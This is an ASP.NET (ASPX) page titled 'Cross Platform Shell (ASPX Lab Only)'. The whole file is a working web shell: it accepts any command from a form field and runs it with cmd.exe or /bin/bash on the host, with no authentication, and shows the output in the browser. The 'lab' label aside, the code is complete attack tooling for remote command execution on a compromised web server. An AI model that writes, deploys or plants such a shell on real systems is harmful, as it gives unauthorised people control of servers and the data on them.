<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Text" %>
<script runat="server">
    string output = "";
    bool isWindows;
    string osInfo;

    protected void Page_Load(object sender, EventArgs e)
    {
        PlatformID pid = Environment.OSVersion.Platform;
        isWindows = (pid != PlatformID.Unix && pid != PlatformID.MacOSX);
        osInfo = Environment.OSVersion.ToString();

        if (Request.HttpMethod == "POST" && !string.IsNullOrEmpty(Request.Form["cmd"]))
        {
            string cmd = Request.Form["cmd"].Trim();
            if (cmd.Length > 1024)
            {
                output = "Command too long (max 1024)";
                return;
            }

            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                if (isWindows)
                {
                    psi.FileName = "cmd.exe";
                    psi.Arguments = string.Format("/c {0}", cmd);
                }
                else
                {
                    psi.FileName = "/bin/bash";
                    psi.Arguments = string.Format("-c {0}", cmd);
                }

                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.StandardOutputEncoding = Encoding.UTF8;
                psi.StandardErrorEncoding = Encoding.UTF8;
                psi.CreateNoWindow = true;

                using (Process p = Process.Start(psi))
                {
                    string stdout = p.StandardOutput.ReadToEnd();
                    string stderr = p.StandardError.ReadToEnd();
                    p.WaitForExit();
                    output = stdout + stderr;
                    if (string.IsNullOrEmpty(output))
                        output = "No output or command returned empty.";
                }
            }
            catch (Exception ex)
            {
                output = "Execute Exception: " + ex.Message;
            }
        }
    }

    public string H(string raw)
    {
        return System.Web.HttpUtility.HtmlEncode(raw ?? "");
    }
</script>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Cross Platform Shell (ASPX Lab Only)</title>
    <style>
        * {
            box-sizing: border-box;
        }
        body {
            font-family: sans-serif;
            color: rgba(0,0,0,.85);
            max-width:900px;
            margin:2rem auto;
            padding:0 15px;
        }
        pre, input, button {
            padding:10px;
            border-radius:6px;
        }
        label {
            display:block;
            margin-bottom:6px;
        }
        input {
            flex:1;
            background-color:#efefef;
            border:2px solid transparent;
            font-size:14px;
        }
        input:focus {
            outline:none;
            background:#fff;
            border:2px solid #99ccff;
        }
        button {
            border:none;
            cursor:pointer;
            margin-left:8px;
            background:#d8e8ff;
        }
        button:hover {
            background-color:#b8d4f8;
        }
        .form-group {
            display:flex;
            padding:10px 0 20px;
        }
        pre{
            background:#111;
            color:#0f0;
            white-space:pre-wrap;
            word-wrap:break-word;
            overflow-x:auto;
        }
        .info{
            background:#f0f8ff;
            padding:8px 12px;
            border-radius:5px;
            margin-bottom:15px;
        }
    </style>
</head>
<body>
    <h1>Cross Platform Command Exec (ASPX Lab)</h1>
    <div class="info">
        OS Detected: <%= H(isWindows ? "Windows" : "Linux") %><br/>
        OS Info: <%= H(osInfo) %>
    </div>
    <h2>Execute Command</h2>
    <form method="post">
        <label for="cmd"><strong>Command</strong></label>
        <div class="form-group">
            <input type="text" name="cmd" id="cmd" value="<%= H(Request.Form["cmd"]) %>"
                   onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus>
            <button type="submit">Run</button>
        </div>
    </form>
    <% if (Request.HttpMethod == "POST") { %>
        <h2>Output</h2>
        <pre><%= H(output) %></pre>
    <% } %>
</body>
</html>
